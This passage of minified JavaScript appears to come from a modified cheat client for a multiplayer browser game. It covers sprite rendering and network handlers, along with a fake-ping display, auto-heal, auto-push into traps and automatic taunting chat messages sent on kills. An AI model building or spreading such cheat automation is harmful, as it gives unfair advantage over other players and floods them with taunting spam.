    ((n = n || M).lineWidth = 5.5), (n.lineJoin = "miter");
    let i = (Math.PI / 4) * (R.weapons[t.weaponIndex].armS || 1),
        o = (t.buildIndex < 0 && R.weapons[t.weaponIndex].hndS) || 1,
        a = (t.buildIndex < 0 && R.weapons[t.weaponIndex].hndD) || 1;
    if (
        (t.tailIndex > 0 && zf(t.tailIndex, n, t),
         !(t.buildIndex < 0) ||
         R.weapons[t.weaponIndex].aboveHand ||
         (Ar(
            R.weapons[t.weaponIndex],
            T.weaponVariants[t.weaponVariant].src,
            t.scale,
            0,
            n
        ),
          null == R.weapons[t.weaponIndex].projectile ||
          R.weapons[t.weaponIndex].hideProjectile ||
          Zn(t.scale, 0, R.projectiles[R.weapons[t.weaponIndex].projectile], M)),
         (n.fillStyle = T.skinColors[t.skinColor]),
         Q(t.scale * Math.cos(i), t.scale * Math.sin(i), 14),
         Q(t.scale * a * Math.cos(-i * o), t.scale * a * Math.sin(-i * o), 14),
         t.buildIndex < 0 &&
         R.weapons[t.weaponIndex].aboveHand &&
         (Ar(
            R.weapons[t.weaponIndex],
            T.weaponVariants[t.weaponVariant].src,
            t.scale,
            0,
            n
        ),
          null == R.weapons[t.weaponIndex].projectile ||
          R.weapons[t.weaponIndex].hideProjectile ||
          Zn(t.scale, 0, R.projectiles[R.weapons[t.weaponIndex].projectile], M)),
         t.buildIndex >= 0)
    ) {
        let r = Ss(R.list[t.buildIndex]);
        n.drawImage(r, t.scale - R.list[t.buildIndex].holdOffset, -r.width / 2);
    }
    Q(0, 0, t.scale, n),
        t.skinIndex > 0 && (n.rotate(Math.PI / 2), _o(t.skinIndex, n, null, t));
}

function renderPlayerTracer(t, n) {
    ((n = n || M).lineWidth = 5.5), (n.lineJoin = "miter");
    let i = (Math.PI / 4) * (R.weapons[t.weaponIndex].armS || 1),
        o = (t.buildIndex < 0 && R.weapons[t.weaponIndex].hndS) || 1,
        a = (t.buildIndex < 0 && R.weapons[t.weaponIndex].hndD) || 1;
    if (
        (t.tailIndex > 0 && zf(t.tailIndex, n, t),
         !(t.buildIndex < 0) ||
         R.weapons[t.weaponIndex].aboveHand ||
         (Ar(
            R.weapons[t.weaponIndex],
            T.weaponVariants[t.weaponVariant].src,
            t.scale,
            0,
            n
        ),
          null == R.weapons[t.weaponIndex].projectile ||
          R.weapons[t.weaponIndex].hideProjectile ||
          Zn(t.scale, 0, R.projectiles[R.weapons[t.weaponIndex].projectile], M)),
         (n.fillStyle = T.skinColors[t.skinColor]),
         Q(t.scale * Math.cos(i), t.scale * Math.sin(i), 14),
         Q(t.scale * a * Math.cos(-i * o), t.scale * a * Math.sin(-i * o), 14),
         t.buildIndex < 0 &&
         R.weapons[t.weaponIndex].aboveHand &&
         (Ar(
            R.weapons[t.weaponIndex],
            T.weaponVariants[t.weaponVariant].src,
            t.scale,
            0,
            n
        ),
          null == R.weapons[t.weaponIndex].projectile ||
          R.weapons[t.weaponIndex].hideProjectile ||
          Zn(t.scale, 0, R.projectiles[R.weapons[t.weaponIndex].projectile], M)),
         t.buildIndex >= 0)
    ) {
        let r = Ss(R.list[t.buildIndex]);
        n.drawImage(r, t.scale - R.list[t.buildIndex].holdOffset, -r.width / 2);
    }
    Q(0, 0, t.scale, n),
        t.skinIndex > 0 && (n.rotate(Math.PI / 2), _o(t.skinIndex, n, null, t));
}
const Mr = {},
      Er = {};
let De;

function _o(t, n, i, o) {
    if (!(De = Mr[t])) {
        let a = new Image();
        (a.onload = function () {
            (this.isLoaded = !0), (this.onload = null);
        }),
            (a.src = "./img/hats/hat_" + t + ".png"),
            (Mr[t] = a),
            (De = a);
    }
    let r = i || Er[t];
    if (!r) {
        for (let s = 0; s < Xt.length; ++s)
            if (Xt[s].id == t) {
                r = Xt[s];
                break;
            }
        Er[t] = r;
    }
    (M.globalAlpha = 1),
        De.isLoaded &&
        n.drawImage(De, -r.scale / 2, -r.scale / 2, r.scale, r.scale),
        !i &&
        r.topSprite &&
        (n.save(), n.rotate(o.skinRot), _o(t + "_top", n, r, o), n.restore());
}

function lovedune2024(t, n, i, o, a, r) {
    if (!(De = Mr[t])) {
        let s = new Image();
        (s.onload = function () {
            (this.isLoaded = !0), (this.onload = null);
        }),
            (s.src = "./img/hats/hat_" + t + ".png"),
            (Mr[t] = s),
            (De = s);
    }
    let l = i || Er[t];
    if (!l) {
        for (let c = 0; c < Xt.length; ++c)
            if (Xt[c].id == t) {
                l = Xt[c];
                break;
            }
        Er[t] = l;
    }
    (M.globalAlpha = a),
        De.isLoaded &&
        n.drawImage(De, -l.scale / 2, -l.scale / 2, l.scale, l.scale),
        !i &&
        l.topSprite &&
        (n.save(), n.rotate(r), lovedune2024(t + "_top", n, l, o), n.restore());
}
const Pr = {},
      Cr = {};

function zf(t, n, i) {
    if (!(De = Pr[t])) {
        let o = new Image();
        (o.onload = function () {
            (this.isLoaded = !0), (this.onload = null);
        }),
            (o.src = "./img/accessories/access_" + t + ".png"),
            (Pr[t] = o),
            (De = o);
    }
    let a = Cr[t];
    if (!a) {
        for (let r = 0; r < Gt.length; ++r)
            if (Gt[r].id == t) {
                a = Gt[r];
                break;
            }
        Cr[t] = a;
    }
    De.isLoaded &&
        (n.save(),
         n.translate(-20 - (a.xOff || 0), 0),
         a.spin && n.rotate(i.skinRot),
         n.drawImage(De, -(a.scale / 2), -(a.scale / 2), a.scale, a.scale),
         n.restore());
}
var jn = {};

function Ar(t, n, i, o, a) {
    let r = t.src + (n || ""),
        s = jn[r];
    s ||
        (((s = new Image()).onload = function () {
        this.isLoaded = !0;
    }),
         (s.src = "./img/weapons/" + r + ".png"),
         (jn[r] = s)),
        s.isLoaded &&
        a.drawImage(
        s,
        i + t.xOff - t.length / 2,
        o + t.yOff - t.width / 2,
        t.length,
        t.width
    );
}
const Dr = {};

function Hf(t) {
    let n =
        t.y >= T.mapScale - T.snowBiomeTop ? 2 : t.y <= T.snowBiomeTop ? 1 : 0,
        i = t.type + "_" + t.scale + "_" + n,
        o = Dr[i];
    if (!o) {
        let a = document.createElement("canvas");
        a.width = a.height = 2.1 * t.scale + 5.5;
        let r = a.getContext("2d");
        if (
            (r.translate(a.width / 2, a.height / 2),
             r.rotate(C.randFloat(0, Math.PI)),
             (r.strokeStyle = ei),
             (r.lineWidth = 5.5),
             0 == t.type)
        ) {
            (r.shadowBlur = 10), (r.shadowColor = "rgba(0, 0, 0, 0.75)");
            let s;
            for (var l = 0; l < 2; ++l)
                Ie(r, 7, (s = y.scale * (l ? 0.5 : 1)), 0.7 * s),
                    (r.fillStyle = n
                     ? l
                     ? "#fff"
                     : "#e3f1f4"
                     : l
                     ? "#b4db62"
                     : "#9ebf57"),
                    r.fill(),
                    l || r.stroke();
        } else if (1 == t.type) {
            if (2 == n)
                (r.shadowBlur = 10),
                    (r.shadowColor = "rgba(0, 0, 0, 0.75)"),
                    (r.fillStyle = "#606060"),
                    Ie(r, 6, 0.3 * t.scale, 0.71 * t.scale),
                    r.fill(),
                    r.stroke(),
                    (r.fillStyle = "#89a54c"),
                    Q(0, 0, 0.55 * t.scale, r),
                    (r.fillStyle = "#a5c65b"),
                    Q(0, 0, 0.3 * t.scale, r, !0);
            else {
                (r.shadowBlur = 10),
                    (r.shadowColor = "rgba(0, 0, 0, 0.75)"),
                    Uf(r, 6, y.scale, 0.7 * y.scale),
                    (r.fillStyle = n ? "#e3f1f4" : "#89a54c"),
                    r.fill(),
                    r.stroke(),
                    (r.fillStyle = n ? "#6a64af" : "#c15555");
                let c,
                    d = Ze / 4;
                (r.shadowBlur = 0), (r.shadowColor = "rgba(0, 0, 0, 0)");
                for (var l = 0; l < 4; ++l)
                    Q(
                        (c = C.randInt(y.scale / 3.5, y.scale / 2.3)) * Math.cos(d * l),
                        c * Math.sin(d * l),
                        C.randInt(10, 12),
                        r
                    );
            }
        } else
            (r.shadowBlur = 10),
                (r.shadowColor = "rgba(0, 0, 0, 0.75)"),
                (2 == t.type || 3 == t.type) &&
                ((r.fillStyle =
                  2 == t.type ? (2 == n ? "#938d77" : "#939393") : "#e0c655"),
                 Ie(r, 3, t.scale, t.scale),
                 r.fill(),
                 r.stroke(),
                 (r.fillStyle =
                  2 == t.type ? (2 == n ? "#b2ab90" : "#bcbcbc") : "#ebdca3"),
                 Ie(r, 3, 0.55 * t.scale, 0.65 * t.scale),
                 r.fill());
        (o = a), (Dr[i] = o);
    }
    return o;
}

function Or(t, n, i) {
    let o = t.lineWidth || 0;
    (i /= 2), t.beginPath();
    let a = (2 * Math.PI) / n;
    for (let r = 0; r < n; r++)
        t.lineTo(
            i + (i - o / 2) * Math.cos(a * r),
            i + (i - o / 2) * Math.sin(a * r)
        );
    t.closePath();
}

function Ff() {
    let t = 2 * T.volcanoScale,
        n = document.createElement("canvas");
    (n.width = t), (n.height = t);
    let i = n.getContext("2d");
    (i.strokeStyle = "#3e3e3e"),
        (i.lineWidth = 11),
        (i.fillStyle = "#7f7f7f"),
        Or(i, 10, t),
        i.fill(),
        i.stroke(),
        (Me.land = n);
    let o = document.createElement("canvas"),
        a = 2 * T.innerVolcanoScale;
    (o.width = a), (o.height = a);
    let r = o.getContext("2d");
    (r.strokeStyle = ei),
        (r.lineWidth = 8.8),
        (r.fillStyle = "#f54e16"),
        (r.strokeStyle = "#f56f16"),
        Or(r, 10, a),
        r.fill(),
        r.stroke(),
        (Me.lava = o);
}
Ff();
const Rr = [];

function Ss(t, n) {
    let i = Rr[t.id];
    if (!i || n) {
        let o = document.createElement("canvas");
        o.width = o.height =
            2.5 * t.scale + 5.5 + (R.list[t.id].spritePadding || 0);
        let a = o.getContext("2d");
        if (
            (a.translate(o.width / 2, o.height / 2),
             a.rotate(n ? 0 : Math.PI / 2),
             (a.strokeStyle = ei),
             (a.lineWidth = 5.5 * (n ? o.width / 81 : 1)),
             "apple" == t.name)
        ) {
            (a.fillStyle = "#c15555"), Q(0, 0, t.scale, a), (a.fillStyle = "#89a54c");
            let r = -(Math.PI / 2);
            Vf(t.scale * Math.cos(r), t.scale * Math.sin(r), 25, r + Math.PI / 2, a);
        } else if ("cookie" == t.name) {
            (a.fillStyle = "#cca861"), Q(0, 0, t.scale, a), (a.fillStyle = "#937c4b");
            for (var s, l = 4, c = Ze / l, d = 0; d < l; ++d)
                Q(
                    (s = C.randInt(t.scale / 2.5, t.scale / 1.7)) * Math.cos(c * d),
                    s * Math.sin(c * d),
                    C.randInt(4, 5),
                    a,
                    !0
                );
        } else if ("cheese" == t.name) {
            (a.fillStyle = "#f4f3ac"), Q(0, 0, t.scale, a), (a.fillStyle = "#c3c28b");
            for (var s, l = 4, c = Ze / l, d = 0; d < l; ++d)
                Q(
                    (s = C.randInt(t.scale / 2.5, t.scale / 1.7)) * Math.cos(c * d),
                    s * Math.sin(c * d),
                    C.randInt(4, 5),
                    a,
                    !0
                );
        } else if (
            "wood wall" == t.name ||
            "stone wall" == t.name ||
            "castle wall" == t.name
        ) {
            a.fillStyle =
                "castle wall" == t.name
                ? "#83898e"
            : "wood wall" == t.name
                ? "#a5974c"
            : "#939393";
            let h = "castle wall" == t.name ? 4 : 3;
            Ie(a, h, 1.1 * t.scale, 1.1 * t.scale),
                a.fill(),
                a.stroke(),
                (a.fillStyle =
                 "castle wall" == t.name
                 ? "#9da4aa"
                 : "wood wall" == t.name
                 ? "#c9b758"
                 : "#bcbcbc"),
                Ie(a, h, 0.65 * t.scale, 0.65 * t.scale),
                a.fill();
        } else if (
            "spikes" == t.name ||
            "greater spikes" == t.name ||
            "poison spikes" == t.name ||
            "spinning spikes" == t.name
        ) {
            var u = 0.6 * t.scale;
            let p = M.createRadialGradient(0, 0, t.scale, 0, 0, u);
            p.addColorStop(0.6, "#9c91e5"),
                p.addColorStop(0.9, "#9c91e5"),
                (a.fillStyle = p),
                (a.shadowColor = "rgba(0, 0, 0, 0.5)"),
                (a.shadowBlur = 10),
                Ie(a, "spikes" == t.name ? 5 : 6, t.scale, u),
                a.fill(),
                a.stroke(),
                (a.fillStyle = "#a5974c"),
                Q(0, 0, u, a),
                (a.fillStyle = "#c9b758"),
                Q(0, 0, u / 2, a, !0);
        } else if (
            "windmill" == t.name ||
            "faster windmill" == t.name ||
            "power mill" == t.name
        )
            (a.shadowColor = "rgba(0, 0, 0, 0.2)"),
                (a.shadowBlur = 10),
                (a.fillStyle = "#a5974c"),
                Q(0, 0, t.scale, a),
                (a.fillStyle = "#c9b758"),
                En(0, 0, 1.5 * t.scale, 29, 4, a),
                (a.fillStyle = "#a5974c"),
                Q(0, 0, 0.5 * t.scale, a);
        else if ("mine" == t.name)
            (a.fillStyle = "#939393"),
                Ie(a, 3, t.scale, t.scale),
                a.fill(),
                a.stroke(),
                (a.fillStyle = "#bcbcbc"),
                Ie(a, 3, 0.55 * t.scale, 0.65 * t.scale),
                a.fill();
        else if ("sapling" == t.name)
            for (var d = 0; d < 2; ++d) {
                var u = t.scale * (d ? 0.5 : 1);
                Ie(a, 7, u, 0.7 * u),
                    (a.fillStyle = d ? "#b4db62" : "#9ebf57"),
                    a.fill(),
                    d || a.stroke();
            }
        else if ("pit trap" == t.name)
            (a.fillStyle = "#a5974c"),
                Ie(a, 3, 1.1 * t.scale, 1.1 * t.scale),
                a.fill(),
                a.stroke(),
                (a.fillStyle = ei),
                Ie(a, 3, 0.65 * t.scale, 0.65 * t.scale),
                a.fill();
        else if ("boost pad" == t.name)
            (a.fillStyle = "#7e7f82"),
                kt(0, 0, 2 * t.scale, 2 * t.scale, a),
                a.fill(),
                a.stroke(),
                (a.fillStyle = "#dbd97d"),
                Lf(1 * t.scale, a);
        else if ("turret" == t.name)
            (a.fillStyle = "#a5974c"),
                Q(0, 0, t.scale, a),
                a.fill(),
                a.stroke(),
                (a.fillStyle = "#939393"),
                kt(0, -25, 0.9 * t.scale, 50, a),
                Q(0, 0, 0.6 * t.scale, a),
                a.fill(),
                a.stroke();
        else if ("platform" == t.name) {
            a.fillStyle = "#cebd5f";
            let f = 2 * t.scale,
                $ = f / 4,
                g = -(t.scale / 2);
            for (var d = 0; d < 4; ++d)
                kt(g - $ / 2, 0, $, 2 * t.scale, a), a.fill(), a.stroke(), (g += f / 4);
        } else
            "healing pad" == t.name
                ? ((a.fillStyle = "#7e7f82"),
                   kt(0, 0, 2 * t.scale, 2 * t.scale, a),
                   a.fill(),
                   a.stroke(),
                   (a.fillStyle = "#db6e6e"),
                   En(0, 0, 0.65 * t.scale, 20, 4, a, !0))
            : "spawn pad" == t.name
                ? ((a.fillStyle = "#7e7f82"),
                   kt(0, 0, 2 * t.scale, 2 * t.scale, a),
                   a.fill(),
                   a.stroke(),
                   (a.fillStyle = "#71aad6"),
                   Q(0, 0, 0.6 * t.scale, a))
            : "blocker" == t.name
                ? ((a.fillStyle = "#7e7f82"),
                   Q(0, 0, t.scale, a),
                   a.fill(),
                   a.stroke(),
                   a.rotate(Math.PI / 4),
                   (a.fillStyle = "#db6e6e"),
                   En(0, 0, 0.65 * t.scale, 20, 4, a, !0))
            : "teleporter" == t.name &&
                ((a.fillStyle = "#7e7f82"),
                 Q(0, 0, t.scale, a),
                 a.fill(),
                 a.stroke(),
                 a.rotate(Math.PI / 4),
                 (a.fillStyle = "#d76edb"),
                 Q(0, 0, 0.5 * t.scale, a, !0));
        (i = o), n || (Rr[t.id] = i);
    }
    return i;
}

function Vf(t, n, i, o, a) {
    let r = t + i * Math.cos(o),
        s = n + i * Math.sin(o),
        l = 0.4 * i;
    a.moveTo(t, n),
        a.beginPath(),
        a.quadraticCurveTo(
        (t + r) / 2 + l * Math.cos(o + Math.PI / 2),
        (n + s) / 2 + l * Math.sin(o + Math.PI / 2),
        r,
        s
    ),
        a.quadraticCurveTo(
        (t + r) / 2 - l * Math.cos(o + Math.PI / 2),
        (n + s) / 2 - l * Math.sin(o + Math.PI / 2),
        t,
        n
    ),
        a.closePath(),
        a.fill(),
        a.stroke();
}

function Q(t, n, i, o, a, r) {
    (o = o || M).beginPath(),
        o.arc(t, n, i, 0, 2 * Math.PI),
        r || o.fill(),
        a || o.stroke();
}

function Ie(t, n, i, o) {
    let a = (Math.PI / 2) * 3,
        r,
        s,
        l = Math.PI / n;
    t.beginPath(), t.moveTo(0, -i);
    for (let c = 0; c < n; c++)
        (r = Math.cos(a) * i),
            (s = Math.sin(a) * i),
            t.lineTo(r, s),
            (a += l),
            (r = Math.cos(a) * o),
            (s = Math.sin(a) * o),
            t.lineTo(r, s),
            (a += l);
    t.lineTo(0, -i), t.closePath();
}

function kt(t, n, i, o, a, r) {
    a.fillRect(t - i / 2, n - o / 2, i, o),
        r || a.strokeRect(t - i / 2, n - o / 2, i, o);
}

function En(t, n, i, o, a, r, s) {
    r.save(), r.translate(t, n), (a = Math.ceil(a / 2));
    for (let l = 0; l < a; l++) kt(0, 0, 2 * i, o, r, s), r.rotate(Math.PI / a);
    r.restore();
}

function Uf(t, n, i, o) {
    let a = (Math.PI / 2) * 3,
        r = Math.PI / n,
        s;
    t.beginPath(), t.moveTo(0, -o);
    for (let l = 0; l < n; l++)
        (s = C.randInt(i + 0.9, 1.2 * i)),
            t.quadraticCurveTo(
            Math.cos(a + r) * s,
            Math.sin(a + r) * s,
            Math.cos(a + 2 * r) * o,
            Math.sin(a + 2 * r) * o
        ),
            (a += 2 * r);
    t.lineTo(0, -o), t.closePath();
}

function Lf(t, n) {
    n = n || M;
    let i = t * (Math.sqrt(3) / 2);
    n.beginPath(),
        n.moveTo(0, -i / 2),
        n.lineTo(-t / 2, i / 2),
        n.lineTo(t / 2, i / 2),
        n.lineTo(0, -i / 2),
        n.fill(),
        n.closePath();
}

function Nf() {
    let t = T.mapScale / 2;
    ue.add(
        0,
        t,
        t + 200,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t,
                y: t + 200,
            }
        ),
        T.treeScales[3],
        0
    ),
        ue.add(
        1,
        t,
        t - 480,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t,
                y: t - 480,
            }
        ),
        T.treeScales[3],
        0
    ),
        ue.add(
        2,
        t + 300,
        t + 450,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t + 300,
                y: t + 450,
            }
        ),
        T.treeScales[3],
        0
    ),
        ue.add(
        3,
        t - 950,
        t - 130,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t - 950,
                y: t + -130,
            }
        ),
        T.treeScales[2],
        0
    ),
        ue.add(
        4,
        t - 750,
        t - 400,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t - 750,
                y: t - 400,
            }
        ),
        T.treeScales[3],
        0
    ),
        ue.add(
        5,
        t - 700,
        t + 400,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t - 700,
                y: t + 400,
            }
        ),
        T.treeScales[2],
        0
    ),
        ue.add(
        6,
        t + 800,
        t - 200,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t + 800,
                y: t - 200,
            }
        ),
        T.treeScales[3],
        0
    ),
        ue.add(
        7,
        t - 260,
        t + 340,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t - 200,
                y: t + 340,
            }
        ),
        T.bushScales[3],
        1
    ),
        ue.add(
        8,
        t + 760,
        t + 310,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t + 760,
                y: t + 310,
            }
        ),
        T.bushScales[3],
        1
    ),
        ue.add(
        9,
        t - 800,
        t + 100,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t - 800,
                y: t + 100,
            }
        ),
        T.bushScales[3],
        1
    ),
        ue.add(
        10,
        t - 800,
        t + 300,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t - 800,
                y: t + 300,
            }
        ),
        R.list[4].scale,
        R.list[4].id,
        R.list[10]
    ),
        ue.add(
        11,
        t + 650,
        t - 390,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t + 650,
                y: t - 390,
            }
        ),
        R.list[4].scale,
        R.list[4].id,
        R.list[10]
    ),
        ue.add(
        12,
        t - 400,
        t - 450,
        caf(
            {
                x: t,
                y: t,
            },
            {
                x: t - 400,
                y: t - 450,
            }
        ),
        T.rockScales[2],
        2
    );
}

function qf(t) {
    for (let n = 0; n < t.length; )
        ue.add(
            t[n],
            t[n + 1],
            t[n + 2],
            t[n + 3],
            t[n + 4],
            t[n + 5],
            R.list[t[n + 6]],
            !0,
            t[n + 7] >= 0
            ? {
                sid: t[n + 7],
            }
            : null
        ),
            (n += 8);
}

function Xf(t, n) {
    (y = Ho(t)) &&
        ((y.dir = n),
         (y.xWiggle += T.gatherWiggle * Math.cos(n + Math.PI)),
         (y.yWiggle += T.gatherWiggle * Math.sin(n + Math.PI)));
}

function Yf(t, n) {
    for (let i = 0; i < Mt.length; ++i) Mt[i].sid == t && (Mt[i].range = n);
}

function $f(t) {
    (y = zo(t)) && y.startAnim();
}

function Kf(t) {
    for (var n = 0; n < ye.length; ++n)
        (ye[n].forcePos = !ye[n].visible), (ye[n].visible = !1);
    if (t) {
        let i = Date.now();
        for (var n = 0; n < t.length; )
            (y = zo(t[n]))
                ? ((y.index = t[n + 1]),
                   (y.t1 = void 0 === y.t2 ? i : y.t2),
                   (y.t2 = i),
                   (y.x1 = y.x),
                   (y.y1 = y.y),
                   (y.x2 = t[n + 2]),
                   (y.y2 = t[n + 3]),
                   (y.d1 = void 0 === y.d2 ? t[n + 4] : y.d2),
                   (y.d2 = t[n + 4]),
                   (y.lastHealth = y.health),
                   (y.health = t[n + 5]),
                   (y.dt = 0),
                   (y.visible = !0))
            : (((y = ar.spawn(t[n + 2], t[n + 3], t[n + 4], t[n + 1])).x2 = y.x),
               (y.y2 = y.y),
               (y.d2 = y.dir),
               (y.health = t[n + 5]),
               ar.aiTypes[t[n + 1]].name || (y.name = T.cowNames[t[n + 6]]),
               (y.forcePos = !0),
               (y.sid = t[n]),
               (y.visible = !0)),
                (n += 7);
        y.lastHealth != y.health &&
            y.visible &&
            Hn.showText(
            y.x,
            y.y,
            40,
            0.18,
            900,
            Math.round(Math.abs(y.lastHealth - y.health)),
            "#fff"
        );
    }
}
const _r = {};

function Jf(t, n) {
    let i = t.index,
        o = _r[i];
    if (!o) {
        let a = new Image();
        (a.onload = function () {
            (this.isLoaded = !0), (this.onload = null);
        }),
            (a.src = "./img/animals/" + t.src + ".png"),
            (o = a),
            (_r[i] = o);
    }
    if (o.isLoaded) {
        let r = 1.2 * t.scale * (t.spriteMlt || 1);
        n.drawImage(o, -r, -r, 2 * r, 2 * r);
    }
}

function Bo(t, n, i) {
    return t + i >= 0 && t - i <= se && n + i >= 0 && n - i <= re;
}

function Qf(t, n) {
    let i = nu(t[0]);
    i ||
        ((i = KTA.addPlayer(n, t[0], t[1], T, C, po, ue, J, ye, R, Xt, Gt)),
         J.push(i)),
        i.spawn(n ? xi : null),
        (i.visible = !1),
        (i.x2 = void 0),
        (i.y2 = void 0),
        (i.x3 = void 0),
        (i.y3 = void 0),
        i.setData(t),
        n &&
        ((Re = (E = i).x),
         (_e = E.y),
         To(),
         Do(),
         Ro(),
         Oo(0),
         (us.style.display = "block")),
        n ||
        addMenuChText(
        "Encountered " + t[2] + "[" + t[1] + "]",
        "#00eeba",
        "",
        "#00eeba"
    );
}

function Zf(t) {}

function jf(t, n) {
    E && (E.itemCounts[t] = n);
}

function eu(t, n, i) {
    E && ((E[t] = n), i && Do()),
        "kills" == t &&
        document.getElementById("killchat").checked &&
        ("Chicken V3" == document.getElementById("killChatType").value
         ? (ee.send("6", "Dumbasses down: " + n),
            setTimeout(() => {
        ee.send("6", "I'm Super Pro");
    }, 600))
         : "Chat Total Kills" == document.getElementById("killChatType").value
         ? ee.send("6", n + "")
         : "Sam Mod Kill Chat" == document.getElementById("killChatType").value
         ? ee.send("6", "~=SamMOD~discord=sam#7707")
         : "RV2" == document.getElementById("killChatType").value &&
         ee.send("6", "gg - autoGG Master Race"));
}

function nu(t) {
    for (let n = 0; n < J.length; ++n) if (J[n].id == t) return J[n];
    return null;
}

function _i(t) {
    for (let n = 0; n < J.length; ++n) if (J[n].sid == t) return J[n];
    return null;
}

function zo(t) {
    for (let n = 0; n < ye.length; ++n) if (ye[n].sid == t) return ye[n];
    return null;
}

function Ho(t) {
    for (let n = 0; n < et.length; ++n) if (et[n].sid == t) return et[n];
    return null;
}
let Fo = -1;

function getRandomArbitrary(t, n) {
    return Math.random() * (n - t) + t;
}

function su() {
    let t = Date.now() - Fo;
    (window.pingTime = t),
        (Qt.innerText =
         "Ping: " +
         (document.getElementById("fakeping").checked
          ? Math.floor(getRandomArbitrary(180, 220))
          : Date.now() - Fo) +
         " ms");
}
let Pn;

function Vo() {
    Pn && clearTimeout(Pn),
        cs() && ((Fo = Date.now()), ee.send("0")),
        (Pn = setTimeout(Vo, 250));
}

function ru(t) {
    if (t < 0) return;
    let n = Math.floor(t / 60),
        i = t % 60;
    (i = ("0" + i).slice(-2)),
        (dr.innerText = "Server restarting in " + n + ":" + i),
        (dr.hidden = !1);
}

function Uo() {
    (be = (It = Date.now()) - or), (or = It), Of(), requestAnimFrame(Uo);
}

function checkPlace(t, n) {
    try {
        let i = R.list[E.items[t]],
            o = E.scale + i.scale + (i.placeOffset || 0),
            a = E.x + o * Math.cos(n),
            r = E.y + o * Math.sin(n);
        ue.checkItemLocation(a, r, 0.6, i.id, i.scale) && place(t, n);
    } catch (s) {}
}

function place(t, n, i) {
    let o = E.weaponIndex;
    if (
        ((t = E.items[t]),
         !i &&
         t &&
         (Yt(t),
          ee.send("d", 1, n, 1),
          Yt(o, 1),
          document.getElementById("placevizual").checked &&
          "Building" == document.getElementById("placevizualType").value))
    ) {
        let a = R.list[t],
            r = E.scale + a.scale + (a.placeOffset || 0),
            s = E.x2 + r * Math.cos(n),
            l = E.y2 + r * Math.sin(n);
        itemPlacer.push({
            x: s,
            y: l,
            name: a.name,
            scale: a.scale,
            dir: n,
        }),
            setTickout(() => {
            itemPlacer.shift();
        }, 1);
    }
    i && (Yt(t), ee.send("d", 1, n, 1), Yt(o, 1));
}

function heal(t = E.health) {
    for (let n = Math.ceil((100 - t) / R.list[E.items[0]].healing); n--; )
        place(0, vs(), !0);
}
(window.requestAnimFrame =
 window.requestAnimationFrame ||
 window.webkitRequestAnimationFrame ||
 window.mozRequestAnimationFrame ||
 function (t) {}),
    Nf(),
    Uo();
let millData = {
    x: 0,
    y: 0,
    toggle: !0,
},
    inztakillData = {
        toggle: !1,
        aim: !1,
        inInzta: !1,
    };

function calculateAnglesAroundObject(t, n, i, o, a) {
    let r = t - o,
        s = n - a,
        l = Math.sqrt(r * r + s * s);
    return [
        Math.atan2(s, r) + Math.asin(i / l),
        Math.atan2(s, r) - Math.asin(i / l),
    ];
}

function calculateAngularSize(t, n, i) {
    return (
        2 *
        Math.atan(
            i / 2 / Math.sqrt(Math.pow(n.x - t.x, 2) + Math.pow(n.y - t.y, 2))
        ) *
        (180 / Math.PI) *
        (Math.PI / 180)
    );
}

function adjustOverlappingObjects(t) {
    t.sort((t, n) => t.dir - n.dir);
    let n = [];
    for (let i = 0; i < t.length; i++) {
        let o = R.list[t[i].type],
            a = E.scale + o.scale + (o.placeOffset || 0),
            r = E.x + a * Math.cos(t[i].dir),
            s = E.y + a * Math.sin(t[i].dir),
            l = calculateAngularSize(
                E,
                {
                    tmpX: r,
                    tmpY: s,
                },
                o.scale
            ),
            c = t[i],
            d = t[(i + 1) % t.length],
            h = d.dir - c.dir;
        h < 0 && (h += 360);
        h >= 2 * l
            ? n.push(c)
        : c.urgency > d.urgency
            ? n.push(c)
        : c.urgency < d.urgency || n.push(c);
    }
    return n;
}
let gameHitobjectz = [],
    tick = 0,
    placeableAnglez = [],
    placeArr = [],
    izHitting = !1,
    emptAnti = !1;

function getSkinData(t) {
    return $r.hats.find((n) => n.id === t.skinIndex) || {};
}

function getAccData(t) {
    return $r.accessories.find((n) => n.id === t.tailIndex) || {};
}

function collisionDetection(t, n, i) {
    return sqrt((t.x - n.x) ** 2 + (t.y - n.y) ** 2) < i;
}
let placer = {
    toggle: !1,
    itemIndex: 0,
};

function calculateAngle(t, n, i, o) {
    let [a, r] = t,
        [s, l] = i,
        { width: c, height: d } = n,
        { width: h, height: u } = o,
        p = s - a,
        f = l - r,
        $ = Math.sqrt((c + h) ** 2 + (d + u) ** 2) / 2;
    if (Math.abs(p) < $ && Math.abs(f) < $) {
        let g = Math.atan2(f, p),
            m = $ - Math.sqrt(p ** 2 + f ** 2),
            _ = m * Math.cos(g),
            k = m * Math.sin(g);
        (i[0] += _), (i[1] += k);
    }
    let v = i[0] - a,
        b = i[1] - r,
        w = Math.atan2(b, v);
    return w;
}
let replaceArr = [],
    autopuzhing = !1,
    puzhData = [];

function avgDir(t, n) {
    let i = Math.cos(t),
        o = Math.sin(t),
        a = Math.cos(n),
        r = Math.sin(n),
        s = (i + a) / 2,
        l = (o + r) / 2,
        c = Math.atan2(l, s);
    return c < 0 && (c += 2 * Math.PI), c;
}

function autoPush(t) {
    let n = et
    .filter(
        (n) =>
        n.trap &&
        n.active &&
        n.teamObj(E) &&
        cdf(n, t) <= t.scale + n.getScale() + 15
    )
    .sort(function (n, i) {
        return cdf(n, t) - cdf(i, t);
    })[0];
    if (n) {
        let i = et
        .filter(
            (i) =>
            i.dmg &&
            i.active &&
            i.teamObj(E) &&
            cdf(i, n) <= t.scale + n.scale + i.scale + 5
        )
        .sort(function (n, i) {
            return cdf(n, t) - cdf(i, t);
        })[0];
        if (i) {
            let o = {
                x:
                i.x +
                (E.scale + i.scale + E.scale + E.scale) *
                Math.cos(caf(t, i) - Math.PI),
                y:
                i.y +
                (E.scale + i.scale + E.scale + E.scale) *
                Math.sin(caf(t, i) - Math.PI),
                x2: i.x + (cdf(t, i) + E.scale) * Math.cos(caf(t, i) - Math.PI),
